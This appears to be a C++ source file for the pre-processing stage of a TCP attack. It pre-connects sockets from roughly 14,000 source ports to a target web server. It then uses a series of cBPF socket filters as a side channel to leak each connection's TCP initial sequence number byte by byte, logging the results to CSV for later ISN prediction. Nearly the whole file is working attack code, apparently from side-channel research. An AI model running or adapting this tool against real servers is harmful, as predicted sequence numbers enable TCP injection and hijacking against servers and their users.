#include <iostream>
#include <cstring>
#include <unistd.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <thread>
#include <future>
#include <vector>
#include <fcntl.h>
#include <errno.h>
#include <poll.h>
#include <cstdint>
#include <fstream>
#include <string>
#include <sstream>
#include "cbpf_program.h"
const char *hostname = "192.0.2.123";

const std::string http_request = ("GET / HTTP/1.1\r\nHost: " + std::string(hostname) + "\r\nConnection: keep-alive\r\nRange: bytes=0-500\r\n\r\n");

const int GET_REQUEST_LEN = http_request.length();

const int port = 80;
struct hostent *global_host = nullptr;
sockaddr_in6 global_addr_ipv6{};
// bool global_use_ipv6 = true;
bool global_use_ipv6 = false;

const int TOTAL_PORTS = 65536;
const int START_PORT = 32768;
const int END_PORT = 61000; // exclusive
const unsigned int num_threads = 400;

const int MAX_RETRIES = 1; // how many times to try again same src port in case of failure
const std::string CSV_NAME = "tcp_attack/pre_processing/cbpf/ports_isns_cbpf_linux.csv";
const int CONNECTION_TIMEOUT = 3; // seconds (it was 4 seconds)
// android 4 timeout, 100 threads
// linux 3 timeout, 400 threads
std::mutex print_lock;

long long get_real_time_ns()
{
    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);
    return (long long)ts.tv_sec * 1000000000LL + ts.tv_nsec;
}

uint32_t build_isn(uint8_t a, uint8_t b, uint8_t c, uint8_t d, uint32_t t1, uint32_t t2, uint32_t t3, uint32_t t4)
{
    // ISN=ABCD
    // cpp supports modulo arithmetic - negative values are handled automatically
    uint8_t D = d - t1;
    uint8_t C = c - (D + t1 + t2) / 256;
    uint8_t B = b - (C + (D + t1 + t2 + t3) / 256) / 256;
    uint8_t A = a - (B + (C + (D + t1 + t2 + t3 + t4) / 256) / 256) / 256;
    return (A << 24) | (B << 16) | (C << 8) | D;
}
int init_program()
{
    // Resolve hostname to IP address
    std::cout << "Resolving hostname " << hostname << "...\n";
    global_host = gethostbyname(hostname);
    if (!global_host)
    {
        printf("Failed to resolve hostname: %s\n", hostname);
        std::cerr << "Failed to resolve hostname\n";
        return -1;
    }
    std::cout << "Resolved hostname to IP: " << inet_ntoa(*(struct in_addr *)global_host->h_addr) << "\n";
    return 0;
}

int init_program_ipv6()
{
    std::cout << "Resolving hostname " << hostname << " (IPv6)...\n";

    addrinfo hints{};
    hints.ai_family = AF_INET6;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    addrinfo *result = nullptr;
    int rc = getaddrinfo(hostname, nullptr, &hints, &result);
    if (rc != 0 || !result)
    {
        std::cerr << "Failed to resolve hostname (IPv6): " << gai_strerror(rc) << "\n";
        return -1;
    }

    const sockaddr_in6 *addr6 = reinterpret_cast<const sockaddr_in6 *>(result->ai_addr);
    memset(&global_addr_ipv6, 0, sizeof(global_addr_ipv6));
    global_addr_ipv6.sin6_family = AF_INET6;
    global_addr_ipv6.sin6_port = htons(port);
    global_addr_ipv6.sin6_addr = addr6->sin6_addr;

    char ipbuf[INET6_ADDRSTRLEN] = {0};
    inet_ntop(AF_INET6, &global_addr_ipv6.sin6_addr, ipbuf, sizeof(ipbuf));
    std::cout << "Resolved hostname to IPv6: " << ipbuf << "\n";

    freeaddrinfo(result);
    return 0;
}

void close_sock(int &sock)
{
    if (sock >= 0)
    {
        close(sock);
        sock = -1;
    }
}

long long init_socket(int &sock, int source_port)
{
    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
    {
        perror("socket");
        return -1;
    }

    // Bind to a specific source port if requested (source_port == 0 => ephemeral)
    if (source_port != 0)
    {
        // Allow quick reuse of the source port if it's in TIME_WAIT
        int opt = 1;
        if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0)
        {
            perror("setsockopt(SO_REUSEADDR)");
        }
        if (setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt)) < 0)
        {
            perror("setsockopt(SO_REUSEPORT)");
        }

        // Force RST on close to avoid TIME_WAIT
        struct linger sl;
        sl.l_onoff = 1;
        sl.l_linger = 0;
        if (setsockopt(sock, SOL_SOCKET, SO_LINGER, &sl, sizeof(sl)) < 0)
        {
            perror("setsockopt(SO_LINGER)");
        }

        struct sockaddr_in local_addr{};
        local_addr.sin_family = AF_INET;
        local_addr.sin_port = htons(source_port);
        local_addr.sin_addr.s_addr = INADDR_ANY;
        if (bind(sock, (struct sockaddr *)&local_addr, sizeof(local_addr)) < 0)
        {
            perror("bind");
            close_sock(sock);
            return -1;
        }
        else
        {
            // debug
            // std::cout << "Bound client socket to source port " << source_port << "\n";
        }
    }

    // Setup server address
    struct sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    struct hostent host = *global_host;
    memcpy(&addr.sin_addr, host.h_addr, host.h_length);

    // set recv/send timeouts so recv() doesn't block forever
    struct timeval timeout{};
    timeout.tv_sec = CONNECTION_TIMEOUT;
    timeout.tv_usec = 0;
    if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char *)&timeout, sizeof(timeout)) < 0)
    {
        perror("setsockopt(SO_RCVTIMEO)");
    }
    if (setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char *)&timeout, sizeof(timeout)) < 0)
    {
        perror("setsockopt(SO_SNDTIMEO)");
    }

    // Make non-blocking for connect
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    long long timestamp = 0;
    int res;
    timestamp = get_real_time_ns();
    res = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
    // long long timestamp1 = get_real_time_ns();

    // auto elapsed_ms = (timestamp1 - timestamp) / 1000000.0;
    // std::cout << "elapsed time for connect: " << elapsed_ms << " ms\n";

    // Restore blocking mode - explicitly clear O_NONBLOCK
    flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags & ~O_NONBLOCK);

    if (res < 0)
    {
        if (errno != EINPROGRESS)
        {
            perror("connect");
            close(sock);
            return -1;
        }

        int so_error = 0;
        socklen_t len = sizeof(so_error);
        if (getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len) < 0)
        {
            perror("getsockopt");
            close_sock(sock);
            return -1;
        }
        if (so_error != 0)
        {
            fprintf(stderr, "connect failed: %s\n", strerror(so_error));
            close(sock);
            return -1;
        }
    }

    return timestamp;
}

long long init_socket_ipv6(int &sock, int source_port)
{
    sock = socket(AF_INET6, SOCK_STREAM, 0);
    if (sock < 0)
    {
        perror("socket");
        return -1;
    }

    if (source_port != 0)
    {
        int opt = 1;
        if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0)
        {
            perror("setsockopt(SO_REUSEADDR)");
        }
        if (setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt)) < 0)
        {
            perror("setsockopt(SO_REUSEPORT)");
        }

        struct linger sl;
        sl.l_onoff = 1;
        sl.l_linger = 0;
        if (setsockopt(sock, SOL_SOCKET, SO_LINGER, &sl, sizeof(sl)) < 0)
        {
            perror("setsockopt(SO_LINGER)");
        }

        struct sockaddr_in6 local_addr{};
        local_addr.sin6_family = AF_INET6;
        local_addr.sin6_port = htons(source_port);
        local_addr.sin6_addr = in6addr_any;
        if (bind(sock, (struct sockaddr *)&local_addr, sizeof(local_addr)) < 0)
        {
            perror("bind");
            close_sock(sock);
            return -1;
        }
    }

    struct timeval timeout{};
    timeout.tv_sec = CONNECTION_TIMEOUT;
    timeout.tv_usec = 0;
    if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char *)&timeout, sizeof(timeout)) < 0)
    {
        perror("setsockopt(SO_RCVTIMEO)");
    }
    if (setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char *)&timeout, sizeof(timeout)) < 0)
    {
        perror("setsockopt(SO_SNDTIMEO)");
    }

    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    long long timestamp = get_real_time_ns();
    int res = connect(sock, (struct sockaddr *)&global_addr_ipv6, sizeof(global_addr_ipv6));

    flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags & ~O_NONBLOCK);

    if (res < 0)
    {
        if (errno != EINPROGRESS)
        {
            perror("connect");
            close(sock);
            return -1;
        }

        int so_error = 0;
        socklen_t len = sizeof(so_error);
        if (getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len) < 0)
        {
            perror("getsockopt");
            close_sock(sock);
            return -1;
        }
        if (so_error != 0)
        {
            fprintf(stderr, "connect failed: %s\n", strerror(so_error));
            close(sock);
            return -1;
        }
    }

    return timestamp;
}

int find_one_byte_isn(int &sock, sock_fprog &bpf_prog)
{
    // printf("Running find_one_byte_isn with BPF program...\n");
    // Attach cBPF to TCP socket (only affects incoming packets)
    if (setsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER, &bpf_prog, sizeof(bpf_prog)) < 0)
    {
        perror("setsockopt BPF");
        close_sock(sock);
        // exit(EXIT_FAILURE);
        return INT32_MAX;
    }

    // Send HTTP GET request
    send(sock, http_request.c_str(), http_request.length(), 0);

    // Receive and print response
    char buffer[4096];
    ssize_t received;

    received = recv(sock, buffer, sizeof(buffer) - 1, 0);
    if (received < 0)
    {
        perror("recv");
        close_sock(sock);
        return INT32_MAX;
    }

    // check for unexpected error
    if (received > 0 && buffer[0] != 'H')
    {
        printf("packet doesn't start with H, something went wrong\n");
        // exit(EXIT_FAILURE);
        return INT32_MAX;
    }

    if (setsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER, &bpf_prog_no_filter, sizeof(bpf_prog_no_filter)) < 0)
    {
        perror("setsockopt(SO_DETACH_FILTER)");
        close_sock(sock);
        return INT32_MAX;
    }

    // printf("let's empty the buffer:");
    ssize_t received_more = recv(sock, buffer, sizeof(buffer) - 1, 0);
    if (received_more < 0)
    {
        perror("recv");
        close_sock(sock);
        return INT32_MAX;
    }

    return received;
}

// Return the leaked ISN for a pre-connected socket bound to `source_port`.
// Returns UINT32_MAX on error.
// Return pair<isn, timestamp_ns>. On error returns {UINT32_MAX, -1}.
std::pair<uint32_t, long long> get_isn_for_source_port(int &sock, int source_port, long long timestamp_ns)
{
    if (sock < 0)
    {
        return {UINT32_MAX, -1};
    }
    const int isn4 = find_one_byte_isn(sock, bpf_prog4);
    if (sock < 0)
    {
        return {UINT32_MAX, -1};
    }
    const int isn3 = find_one_byte_isn(sock, bpf_prog3);
    if (sock < 0)
    {
        return {UINT32_MAX, -1};
    }
    const int isn2 = find_one_byte_isn(sock, bpf_prog2);
    if (sock < 0)
    {
        return {UINT32_MAX, -1};
    }
    const int isn1 = find_one_byte_isn(sock, bpf_prog1);
    if (sock < 0)
    {
        return {UINT32_MAX, -1};
    }
    // std::cout << "Leaked ISN bytes for source port " << source_port << ": " << isn1 << " " << isn2 << " " << isn3 << " " << isn4 << "\n";
    // check for errors
    if (isn1 > 255 || isn2 > 255 || isn3 > 255 || isn4 > 255 || isn1 < 0 || isn2 < 0 || isn3 < 0 || isn4 < 0)
    {
        std::cerr << "Error: One of the ISN bytes is out of range (0-255)\n";
        return {UINT32_MAX, -1};
    }

    uint32_t isn = build_isn(isn1, isn2, isn3, isn4, GET_REQUEST_LEN, GET_REQUEST_LEN, GET_REQUEST_LEN, GET_REQUEST_LEN);
    isn -= 1; // there is offset of 1
    return {isn, timestamp_ns};
}

std::pair<uint32_t, long long> get_isn_for_source_port_wrapper(int &sock, int source_port, long long &timestamp_ns)
{
    for (int attempt = 0; attempt < MAX_RETRIES; ++attempt)
    {
        auto res = get_isn_for_source_port(sock, source_port, timestamp_ns);
        if (res.first != UINT32_MAX)
            return res;
        std::cerr << "Retrying source port " << source_port << " (attempt " << (attempt + 1) << ")\n";
        close_sock(sock);
    }
    std::cerr << "Failed to get ISN after " << MAX_RETRIES << " attempts\n";
    return {UINT32_MAX, -1};
}

// Save results to a human-readable CSV file: "port,isn,timestamp_ns".
// Uses "ERROR" for failed ISN and "-1" for missing timestamp.
bool save_results_csv(const std::vector<std::pair<uint32_t, long long>> &v, const std::string &path)
{
    std::ofstream out(path);
    if (!out)
        return false;
    out << "port,isn,timestamp_ns\n";
    for (size_t i = 0; i < v.size(); ++i)
    {
        out << i << ',';
        uint32_t isn = v[i].first;
        long long ts = v[i].second;
        if (isn == UINT32_MAX)
            out << "ERROR";
        else
            out << isn;
        out << ',';
        if (ts < 0)
            out << "ERROR";
        else
            out << ts;
        out << '\n';
    }
    return out.good();
}

// Load results from CSV produced by save_results_csv. Missing ports will resize the vector.
bool load_results_csv(const std::string &path, std::vector<std::pair<uint32_t, long long>> &out_vec)
{
    std::ifstream in(path);
    if (!in)
        return false;
    std::string line;
    // skip header
    if (!std::getline(in, line))
        return false;
    std::vector<std::pair<uint32_t, long long>> tmp;
    while (std::getline(in, line))
    {
        if (line.empty())
            continue;
        // expect port,isn,timestamp
        std::stringstream ss(line);
        std::string portstr, isnstr, tsstr;
        if (!std::getline(ss, portstr, ','))
            continue;
        if (!std::getline(ss, isnstr, ','))
            continue;
        if (!std::getline(ss, tsstr))
            tsstr = "";
        int port = 0;
        try
        {
            port = std::stoi(portstr);
        }
        catch (...)
        {
            continue;
        }
        uint32_t val = UINT32_MAX;
        long long ts = -1;
        if (isnstr != "ERROR")
        {
            try
            {
                val = static_cast<uint32_t>(std::stoul(isnstr));
            }
            catch (...)
            {
                val = UINT32_MAX;
            }
        }
        if (!tsstr.empty() && tsstr != "ERROR")
        {
            try
            {
                ts = std::stoll(tsstr);
            }
            catch (...)
            {
                ts = -1;
            }
        }
        if ((size_t)port >= tmp.size())
            tmp.resize(port + 1, {UINT32_MAX, -1});
        tmp[port] = {val, ts};
    }
    out_vec = std::move(tmp);
    return true;
}

void print(const std::vector<std::pair<uint32_t, long long>> &port_isns)
{
    std::cout << "Scan complete. Non-error results:\n";
    for (int p = START_PORT; p < END_PORT; ++p)
    {
        if (port_isns[p].first != UINT32_MAX)
        {
            std::cout << "port " << p << " => ISN " << port_isns[p].first << " ts=" << port_isns[p].second << "\n";
        }
    }
}

void scan(std::vector<std::pair<uint32_t, long long>> &port_isns)
{
    std::cout << "Using " << num_threads << " threads for scanning.\n";

    for (int batch_start = START_PORT; batch_start < END_PORT; batch_start += (int)num_threads * 2)
    {
        const int batch_end = std::min(batch_start + (int)num_threads * 2, END_PORT);
        const int batch_size = (batch_end - batch_start) / 2;

        std::vector<int> sockets(batch_size, -1);
        std::vector<long long> timestamps(batch_size, -1);
        std::vector<int> ports(batch_size, 0);

        for (int i = 0; i < batch_size; ++i)
        {
            const int p = batch_start + i * 2;
            if (port_isns[p].first != UINT32_MAX)
            {
                continue;
            }
            ports[i] = p;
            int sock = -1;
            long long ts = global_use_ipv6 ? init_socket_ipv6(sock, p) : init_socket(sock, p);
            if (ts >= 0)
            {
                sockets[i] = sock;
                timestamps[i] = ts;
            }
            else
            {
                std::cerr << "Failed to pre-connect socket for port " << p << "\n";
            }
            // std::this_thread::sleep_for(std::chrono::milliseconds(10));
            std::this_thread::sleep_for(std::chrono::milliseconds(1));
        }
        // sleep 1 seconds
        // std::this_thread::sleep_for(std::chrono::seconds(CONNECTION_TIMEOUT));

        std::this_thread::sleep_for(std::chrono::milliseconds(1000));
        std::vector<std::thread> threads;
        threads.reserve(batch_size);

        for (int i = 0; i < batch_size; ++i)
        {
            threads.emplace_back([&, i]()
                                 {
                                     int p = ports[i];
                                     int sock = sockets[i];
                                     long long ts = timestamps[i];
                                     if (sock < 0)
                                     {
                                         port_isns[p] = {UINT32_MAX, -1};
                                         return;
                                     }

                                     if (p % 2000 == 0)
                                     {
                                         std::lock_guard<std::mutex> lock(print_lock);
                                         std::cout << "Scanning port " << p << "...\n";
                                         save_results_csv(port_isns, CSV_NAME);
                                     }
                                     {
                                         std::lock_guard<std::mutex> lock(print_lock);
                                         std::cout << "Scanning port " << p << " (batch)\n";
                                     }

                                     auto res = get_isn_for_source_port_wrapper(sock, p, ts);
                                     port_isns[p] = res;
                                     close_sock(sock); });
        }

        for (auto &t : threads)
            t.join();
        // sleep 1 second
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
}

int main(int argc, char **argv)
{
    auto t1 = std::chrono::high_resolution_clock::now();
    printf("Starting cBPF ISN leak scan against %s:%d\n", hostname, port);
    for (int i = 1; i < argc; ++i)
    {
        std::string arg = argv[i];
        if (arg == "--ipv6")
            global_use_ipv6 = true;
    }

    int r = global_use_ipv6 ? init_program_ipv6() : init_program();
    if (r < 0)
        return EXIT_FAILURE;
    std::vector<std::pair<uint32_t, long long>> port_isns(TOTAL_PORTS, {UINT32_MAX, -1});

    // if you want to continue from previous scan, uncomment the next line
    // load_results_csv(CSV_NAME, port_isns);
    // std::cout << "loading previous results\n";

    std::cout << "Erasing everything!!! two rounds\n";
    std::this_thread::sleep_for(std::chrono::seconds(3));

    scan(port_isns);
    // auto res = get_isn_for_source_port_wrapper(15000);
    // std::cout << "ISN for port 15000: " << res.first << " timestamp: " << res.second << "\n";
    save_results_csv(port_isns, CSV_NAME);

    scan(port_isns);
    save_results_csv(port_isns, CSV_NAME);
    auto t2 = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::seconds>(t2 - t1).count();
    std::cout << "Total pre-processing time: " << duration << " seconds" << std::endl;

    return 0;
}